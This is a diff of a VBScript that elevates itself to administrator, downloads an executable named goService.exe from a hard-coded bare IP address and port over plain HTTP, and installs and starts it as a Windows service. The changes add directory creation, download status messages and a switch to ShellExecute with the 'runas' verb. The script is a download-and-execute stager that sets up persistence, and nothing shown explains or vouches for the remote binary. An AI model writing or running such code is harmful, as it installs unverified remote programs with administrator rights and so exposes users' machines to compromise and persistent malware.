@@ -5,9 +5,18 @@ If Not WScript.Arguments.Named.Exists("elevated") Then
 End If
 
 ' Now running as admin, proceed with the script
-Dim url, downloadPath, objXMLHTTP, objStream, objShell
+Dim url, downloadPath, objXMLHTTP, objStream, objShell, objFSO, objFile, installResult, startResult
+Dim commandOutput, errorFile
+
 url = "http://51.81.73.108:5552/uploads/goService.exe"
 downloadPath = "C:\Sys\goService.exe"
+errorFile = "C:\Sys\service_install_log.txt"
+
+' Ensure the directory exists
+Set objFSO = CreateObject("Scripting.FileSystemObject")
+If Not objFSO.FolderExists("C:\Sys") Then
+    objFSO.CreateFolder("C:\Sys")
+End If
 
 ' Download the file
 Set objXMLHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
@@ -22,9 +31,25 @@ If objXMLHTTP.Status = 200 Then
     objStream.Write objXMLHTTP.ResponseBody
     objStream.SaveToFile downloadPath, 2 ' Save as a file and overwrite if exists
     objStream.Close
+    WScript.Echo "File downloaded successfully to " & downloadPath
+Else
+    WScript.Echo "Failed to download file. HTTP Status: " & objXMLHTTP.Status
+    WScript.Quit
 End If
 
-' Install and start the service using the downloaded file
-Set objShell = CreateObject("WScript.Shell")
-objShell.Run """" & downloadPath & """ install", 0, True
-objShell.Run """" & downloadPath & """ start", 0, True
+' Verify the file exists before running commands
+If objFSO.FileExists(downloadPath) Then
+    Set objShell = CreateObject("Shell.Application")
+    
+    ' Install the service
+    WScript.Echo "Installing service..."
+    installResult = objShell.ShellExecute(downloadPath, "install", "", "runas", 1)
+    WScript.Echo "Service installation result: " & installResult
+
+    ' Start the service
+    WScript.Echo "Starting service..."
+    startResult = objShell.ShellExecute(downloadPath, "start", "", "runas", 1)
+    WScript.Echo "Service start result: " & startResult
+Else
+    WScript.Echo "Service file not found: " & downloadPath
+End If
